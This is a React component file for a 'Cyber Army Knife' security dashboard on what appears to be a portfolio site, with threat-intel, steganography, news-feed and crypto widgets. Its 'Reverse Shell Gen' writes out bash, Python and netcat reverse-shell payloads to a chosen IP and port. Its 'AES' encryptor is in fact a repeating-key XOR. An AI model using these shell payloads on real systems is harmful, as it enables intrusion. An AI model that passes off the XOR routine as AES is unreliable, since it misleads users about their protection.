import React, { useState, useEffect } from 'react';
import { 
  Terminal, Shield, Code, Cpu, Database, Search, Lock, 
  AlertTriangle, Radio, ArrowLeft, Copy, Check, Wifi, 
  Hash, Binary, Key, Zap, Rocket, Newspaper, Smile, Server,
  Activity, Globe
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

// ==========================================
// 🤖 REAL AI OPS TOOLS (Secure Backend Call)
// ==========================================

function AiCodeAuditor() {
  const [code, setCode] = useState('');
  const [analysis, setAnalysis] = useState('');
  const [loading, setLoading] = useState(false);

  const analyzeCode = async () => {
    if (!code) return;
    setLoading(true);
    setAnalysis("");

    try {
      const res = await fetch('/api/engine_a', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code })
      });

      // Safe Parse
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (e) {
        throw new Error(`Server returned invalid JSON. Raw: ${text.substring(0, 50)}...`);
      }
      
      if (!res.ok) throw new Error(data.error || "Analysis failed");
      setAnalysis(data.message);

    } catch (error) {
      setAnalysis(`⚠️ Error: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-4">
      <Textarea 
        placeholder="// Paste suspect code here (Python, JS, C++, PHP)..." 
        className="font-mono text-xs bg-slate-950 min-h-[150px] text-green-400 border-slate-800 focus:border-green-500"
        value={code}
        onChange={(e) => setCode(e.target.value)}
      />
      <Button onClick={analyzeCode} disabled={loading} className="w-full bg-green-600 hover:bg-green-700">
        {loading ? <Zap className="w-4 h-4 animate-spin mr-2"/> : <Cpu className="w-4 h-4 mr-2"/>}
        {loading ? "AI Auditing..." : "Audit Code (Secure)"}
      </Button>
      {analysis && (
        <div className="bg-slate-900/90 p-4 rounded-lg border border-green-500/30 text-sm whitespace-pre-wrap leading-relaxed max-h-[300px] overflow-y-auto custom-scrollbar animate-in fade-in slide-in-from-bottom-2">
          <h4 className="font-bold text-green-400 mb-2 flex items-center gap-2">
            <Terminal className="w-4 h-4"/> Audit Report:
          </h4>
          {analysis}
        </div>
      )}
    </div>
  );
}

// ==========================================
// 🦠 REAL THREAT INTEL (Secure Backend Call)
// ==========================================

function VirusTotalScanner() {
  const [target, setTarget] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const scanUrl = async () => {
    if (!target) return;
    setLoading(true);
    setError('');
    setResult(null);

    try {
      const res = await fetch('/api/engine_v', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target })
      });

      // Safe Parse
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (e) {
        throw new Error(`Server returned invalid JSON. Raw: ${text.substring(0, 50)}...`);
      }

      if (!res.ok) throw new Error(data.error || "Scan failed");
      setResult(data.stats);

    } catch (e) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        <Input 
          placeholder="Domain (google.com) or IP (8.8.8.8)" 
          value={target}
          onChange={(e) => setTarget(e.target.value)}
          className="bg-slate-950 border-slate-700"
        />
        <Button onClick={scanUrl} disabled={loading} className="bg-blue-600 hover:bg-blue-700">
          {loading ? "..." : "Scan"}
        </Button>
      </div>

      {error && <div className="text-xs text-red-400 font-mono border border-red-900/50 p-2 rounded bg-red-950/20">{error}</div>}

      {result && (
        <div className="bg-slate-900 p-4 rounded border border-slate-700 grid grid-cols-2 gap-4 text-center animate-in zoom-in-95">
          <div>
            <div className={`text-2xl font-bold ${result.malicious > 0 ? "text-red-500" : "text-green-500"}`}>
              {result.malicious}
            </div>
            <div className="text-xs text-slate-500 uppercase">Malicious</div>
          </div>
          <div>
            <div className="text-2xl font-bold text-slate-300">{result.harmless + result.undetected}</div>
            <div className="text-xs text-slate-500 uppercase">Clean</div>
          </div>
          <div className="col-span-2 pt-2 border-t border-slate-800">
             {result.malicious > 0 ? (
               <Badge className="bg-red-900/50 text-red-400 hover:bg-red-900/50">⚠️ THREAT DETECTED</Badge>
             ) : (
               <Badge className="bg-green-900/50 text-green-400 hover:bg-green-900/50">✅ CLEAN TARGET</Badge>
             )}
          </div>
        </div>
      )}
    </div>
  );
}

// ==========================================
// 🕵️ STEGANOGRAPHY (Hide Text in Images)
// ==========================================

function SteganographyTool() {
  const [mode, setMode] = useState('encode'); // encode | decode
  const [text, setText] = useState('');
  const [image, setImage] = useState(null);
  const [output, setOutput] = useState(null);
  const canvasRef = React.useRef(null);

  const handleImageUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => setImage(img);
      img.src = event.target.result;
    };
    reader.readAsDataURL(file);
    setOutput(null);
  };

  const processSteganography = () => {
    if (!image || (!text && mode === 'encode')) return;
    
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    canvas.width = image.width;
    canvas.height = image.height;
    ctx.drawImage(image, 0, 0);
    
    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imgData.data;

    if (mode === 'encode') {
      // ENCODE: Text -> Binary -> LSB of pixels
      let binary = '';
      for (let i = 0; i < text.length; i++) {
        binary += text.charCodeAt(i).toString(2).padStart(8, '0');
      }
      binary += '00000000'; // Null terminator

      if (binary.length > data.length / 4) {
        alert("Text too long for this image!");
        return;
      }

      let dataIdx = 0;
      for (let i = 0; i < binary.length; i++) {
        const bit = parseInt(binary[i]);
        // Clear LSB then set it to our bit
        data[dataIdx] = (data[dataIdx] & ~1) | bit;
        dataIdx++;
        // Skip Alpha channel (every 4th byte)
        if ((dataIdx + 1) % 4 === 0) dataIdx++; 
      }
      
      ctx.putImageData(imgData, 0, 0);
      setOutput(canvas.toDataURL('image/png'));
    } 
    else {
      // DECODE: LSB of pixels -> Binary -> Text
      let binary = '';
      let charBuffer = '';
      let result = '';
      
      for (let i = 0; i < data.length; i++) {
        // Skip Alpha
        if ((i + 1) % 4 === 0) continue;
        
        binary += (data[i] & 1).toString();
        
        if (binary.length === 8) {
          if (binary === '00000000') break; // Found terminator
          result += String.fromCharCode(parseInt(binary, 2));
          binary = '';
        }
      }
      setOutput(result); // This is the decoded text
    }
  };

  return (
    <div className="space-y-4">
      {/* Hidden Canvas for processing */}
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Mode Switcher */}
      <div className="flex gap-2 p-1 bg-slate-900 rounded-lg w-fit">
        <button onClick={() => {setMode('encode'); setOutput(null);}} className={`px-4 py-1 text-xs rounded transition-all ${mode==='encode' ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-white'}`}>Hide Data</button>
        <button onClick={() => {setMode('decode'); setOutput(null);}} className={`px-4 py-1 text-xs rounded transition-all ${mode==='decode' ? 'bg-purple-600 text-white' : 'text-slate-400 hover:text-white'}`}>Extract Data</button>
      </div>

      {/* Input Area */}
      <div className="space-y-3">
        <Input type="file" accept="image/*" onChange={handleImageUpload} className="bg-slate-950 border-slate-700 text-xs" />
        
        {mode === 'encode' && (
          <Textarea 
            placeholder="Enter secret message..." 
            value={text} 
            onChange={e => setText(e.target.value)} 
            className="bg-slate-950 border-slate-700 font-mono text-xs text-green-400"
          />
        )}
        
        <Button onClick={processSteganography} disabled={!image} className="w-full bg-slate-800 hover:bg-slate-700 border border-slate-700">
          {mode === 'encode' ? <><Lock className="w-4 h-4 mr-2"/> Encrypt into Image</> : <><Search className="w-4 h-4 mr-2"/> Scan Image for Data</>}
        </Button>
      </div>

      {/* Results Area */}
      {output && (
        <div className="animate-in fade-in slide-in-from-bottom-2">
          {mode === 'encode' ? (
            <div className="text-center bg-slate-900 p-4 rounded border border-cyan-900/50">
               <img src={output} alt="Secret" className="max-h-40 mx-auto mb-2 border border-slate-700" />
               <a href={output} download="secret_image.png">
                 <Button size="sm" className="bg-cyan-600 hover:bg-cyan-500 w-full">Download Payload</Button>
               </a>
            </div>
          ) : (
             <div className="bg-black p-4 rounded border border-purple-900/50">
               <div className="text-xs text-slate-500 uppercase mb-1">Decoded Payload:</div>
               <div className="font-mono text-purple-400 text-sm break-all">{output}</div>
             </div>
          )}
        </div>
      )}
    </div>
  );
}

// ==========================================
// 🚀 COOL LIVE APIS (Client Side is fine for these)
// ==========================================

function SpaceXTracker() {
  const [launch, setLaunch] = useState(null);
  useEffect(() => {
    fetch('https://api.spacexdata.com/v4/launches/next')
      .then(res => res.json())
      .then(data => setLaunch(data))
      .catch(e => console.error(e));
  }, []);

  if(!launch) return <div className="text-slate-500 text-sm animate-pulse">Contacting Starlink...</div>;

  return (
    <div className="relative overflow-hidden rounded-lg border border-slate-800 bg-slate-900 h-full">
      {launch.links.patch.small && (
        <img src={launch.links.patch.small} className="absolute right-[-20px] top-[-20px] w-24 h-24 opacity-20 rotate-12" alt="Patch" />
      )}
      <div className="p-4 relative z-10">
        <div className="flex items-center gap-2 mb-2">
          <Rocket className="w-5 h-5 text-orange-500" />
          <h3 className="font-bold text-slate-100">Next Launch</h3>
        </div>
        <div className="text-2xl font-bold text-white mb-1">{launch.name}</div>
        <div className="text-xs text-orange-400 font-mono mb-4">
          {new Date(launch.date_utc).toLocaleString()}
        </div>
        <p className="text-slate-400 text-xs line-clamp-3 mb-4">
          {launch.details || "No mission details available yet."}
        </p>
        <div className="flex gap-2">
           <Badge variant="outline" className="border-slate-600 text-slate-400">Flight #{launch.flight_number}</Badge>
           <Badge variant="outline" className="border-slate-600 text-slate-400">Rocket: Falcon 9</Badge>
        </div>
      </div>
    </div>
  );
}

function HackerNewsFeed() {
  const [stories, setStories] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchNews = async () => {
      try {
        const idsRes = await fetch('https://hacker-news.firebaseio.com/v0/topstories.json');
        const ids = await idsRes.json();
        const top5 = ids.slice(0, 5);
        const storyPromises = top5.map(id => 
          fetch(`https://hacker-news.firebaseio.com/v0/item/${id}.json`).then(res => res.json())
        );
        const results = await Promise.all(storyPromises);
        setStories(results);
      } catch (e) { console.error(e); } 
      finally { setLoading(false); }
    };
    fetchNews();
  }, []);

  return (
    <div className="space-y-3">
      {loading ? (
        <div className="text-slate-500 text-xs">Fetching logs...</div>
      ) : (
        stories.map(story => (
          <a key={story.id} href={story.url} target="_blank" rel="noreferrer" className="block bg-slate-900/50 p-3 rounded border border-slate-800 hover:border-orange-500/50 transition-colors group">
            <h4 className="text-sm font-semibold text-slate-200 group-hover:text-orange-400 truncate">{story.title}</h4>
            <div className="flex justify-between mt-1 text-xs text-slate-500">
              <span>▲ {story.score} points</span>
              <span>by {story.by}</span>
            </div>
          </a>
        ))
      )}
    </div>
  );
}

function CatDestress() {
  const [cat, setCat] = useState(null);
  const fetchCat = () => {
    fetch('https://api.thecatapi.com/v1/images/search')
      .then(res => res.json())
      .then(data => setCat(data[0].url));
  };
  useEffect(() => { fetchCat(); }, []);

  return (
    <div className="text-center">
      <div className="aspect-video bg-slate-950 rounded-lg overflow-hidden mb-2 relative">
        {cat ? (
           <img src={cat} alt="Random Cat" className="w-full h-full object-cover" />
        ) : <div className="w-full h-full flex items-center justify-center text-slate-600">Loading Cat...</div>}
        <Button size="icon" onClick={fetchCat} className="absolute bottom-2 right-2 bg-slate-900/80 hover:bg-slate-800 rounded-full h-8 w-8">
           <Smile className="w-4 h-4" />
        </Button>
      </div>
      <p className="text-xs text-slate-500">Cybersecurity is stressful. Look at this cat.</p>
    </div>
  );
}

// ==========================================
// 🛠️ GENERATORS (Calculators)
// ==========================================

function AesEncryptor() {
  const [text, setText] = useState('');
  const [key, setKey] = useState('');
  const [result, setResult] = useState('');
  const [mode, setMode] = useState('encrypt');

  const process = () => {
    if (!text || !key) return;
    let output = '';
    for (let i = 0; i < text.length; i++) {
      output += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    setResult(mode === 'encrypt' ? btoa(output) : output);
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        <Button size="sm" onClick={() => setMode('encrypt')} className={mode==='encrypt' ? 'bg-green-600' : 'bg-slate-800'}>Encrypt</Button>
        <Button size="sm" onClick={() => setMode('decrypt')} className={mode==='decrypt' ? 'bg-red-600' : 'bg-slate-800'}>Decrypt</Button>
      </div>
      <Input type="password" placeholder="Key" value={key} onChange={(e)=>setKey(e.target.value)} className="bg-slate-950 border-slate-700"/>
      <Textarea placeholder={mode === 'encrypt' ? "Message" : "Ciphertext"} value={text} onChange={(e)=>setText(e.target.value)} className="bg-slate-950 border-slate-700 h-20"/>
      <Button onClick={process} className="w-full bg-slate-800">Process</Button>
      {result && <div className="bg-black p-3 rounded border border-green-900 text-green-500 font-mono text-xs break-all">{result}</div>}
    </div>
  );
}

function ReverseShellGen() {
  const [ip, setIp] = useState('10.0.0.1');
  const [port, setPort] = useState('4444');
  const [type, setType] = useState('bash');
  const payloads = {
    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    nc: `nc -e /bin/sh ${ip} ${port}`
  };
  return (
    <div className="space-y-3">
       <div className="flex gap-2">
         <Input value={ip} onChange={(e)=>setIp(e.target.value)} className="bg-slate-950 border-slate-700 font-mono text-xs"/>
         <Input value={port} onChange={(e)=>setPort(e.target.value)} className="bg-slate-950 border-slate-700 font-mono text-xs w-20"/>
       </div>
       <div className="flex gap-2">
          {Object.keys(payloads).map(k => <Badge key={k} onClick={()=>setType(k)} className={`cursor-pointer ${type===k ? 'bg-red-600': 'bg-slate-800'}`}>{k}</Badge>)}
       </div>
       <Textarea readOnly value={payloads[type]} className="bg-black text-green-500 font-mono text-xs h-20"/>
    </div>
  );
}

// ==========================================
// 🚀 MAIN DASHBOARD LAYOUT
// ==========================================

export default function ToolsDashboard() {
  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 p-4 md:p-8 font-sans">
      <div className="max-w-6xl mx-auto">
        <Link to="/" className="inline-flex items-center text-slate-400 hover:text-cyan-400 mb-8 transition-colors">
          <ArrowLeft className="w-4 h-4 mr-2" /> Back to Portfolio
        </Link>

        <div className="mb-8">
          <h1 className="text-3xl md:text-4xl font-mono font-bold mb-4 flex items-center gap-3">
            <Server className="w-8 h-8 text-cyan-500" />
            <span className="text-slate-100">Cyber Army Knife <span className="text-cyan-600 text-sm align-top">v3.0</span></span>
          </h1>
          <p className="text-slate-400">Integrated with OpenAI, VirusTotal, and SpaceX APIs.</p>
        </div>

        <Tabs defaultValue="live" className="space-y-6">
          <TabsList className="bg-slate-900 border border-slate-800 p-1 w-full md:w-auto flex flex-wrap gap-2">
             <TabsTrigger value="live" className="flex-1 data-[state=active]:bg-cyan-900/20 data-[state=active]:text-cyan-400 border border-transparent data-[state=active]:border-cyan-900/50">
               <Radio className="w-4 h-4 mr-2" /> Live Feeds
             </TabsTrigger>
             <TabsTrigger value="intel" className="flex-1 data-[state=active]:bg-purple-900/20 data-[state=active]:text-purple-400 border border-transparent data-[state=active]:border-purple-900/50">
               <Cpu className="w-4 h-4 mr-2" /> AI & Intel
             </TabsTrigger>
             <TabsTrigger value="tools" className="flex-1 data-[state=active]:bg-red-900/20 data-[state=active]:text-red-400 border border-transparent data-[state=active]:border-red-900/50">
               <Terminal className="w-4 h-4 mr-2" /> Generators
             </TabsTrigger>
          </TabsList>

          {/* 📡 LIVE FEEDS TAB */}
          <TabsContent value="live" className="space-y-6">
            <div className="grid md:grid-cols-3 gap-6">
              <div className="md:col-span-1 h-full">
                <SpaceXTracker />
              </div>
              <div className="md:col-span-1">
                <Card className="bg-slate-900/50 border-slate-800 h-full">
                  <CardHeader><CardTitle className="text-orange-400 flex items-center gap-2"><Newspaper className="w-5 h-5"/> Hacker News</CardTitle></CardHeader>
                  <CardContent><HackerNewsFeed /></CardContent>
                </Card>
              </div>
              <div className="md:col-span-1">
                 <Card className="bg-slate-900/50 border-slate-800 h-full">
                  <CardHeader><CardTitle className="text-pink-400 flex items-center gap-2"><Smile className="w-5 h-5"/> De-Stress Protocol</CardTitle></CardHeader>
                  <CardContent><CatDestress /></CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          {/* 🧠 AI & INTEL TAB */}
          <TabsContent value="intel" className="space-y-6">
             <div className="grid md:grid-cols-2 gap-6">
               <Card className="bg-slate-900/50 border-slate-800">
                 <CardHeader>
                   <CardTitle className="text-green-400 flex items-center gap-2"><Cpu className="w-5 h-5"/> AI Code Auditor</CardTitle>
                   <p className="text-xs text-slate-500">Powered by OpenAI GPT-4o-mini</p>
                 </CardHeader>
                 <CardContent><AiCodeAuditor /></CardContent>
               </Card>
               <Card className="bg-slate-900/50 border-slate-800">
                 <CardHeader>
                   <CardTitle className="text-blue-400 flex items-center gap-2"><Shield className="w-5 h-5"/> VirusTotal Scanner</CardTitle>
                   <p className="text-xs text-slate-500">Domain / IP Reputation Check</p>
                 </CardHeader>
                 <CardContent><VirusTotalScanner /></CardContent>
               </Card>
             </div>
          </TabsContent>

          {/* 🛠️ TOOLS TAB */}
          <TabsContent value="tools" className="space-y-6">
             <div className="grid md:grid-cols-2 gap-6">
               <Card className="bg-slate-900/50 border-slate-800">
                 <CardHeader><CardTitle className="text-red-400 flex items-center gap-2"><Terminal className="w-5 h-5"/> Reverse Shell Gen</CardTitle></CardHeader>
                 <CardContent><ReverseShellGen /></CardContent>
               </Card>
               <Card className="bg-slate-900/50 border-slate-800">
                 <CardHeader><CardTitle className="text-green-400 flex items-center gap-2"><Lock className="w-5 h-5"/> "Ghost Writer" AES</CardTitle></CardHeader>
                 <CardContent><AesEncryptor /></CardContent>
               </Card>
             </div>
          </TabsContent>

        </Tabs>
      </div>
    </div>
  );
}
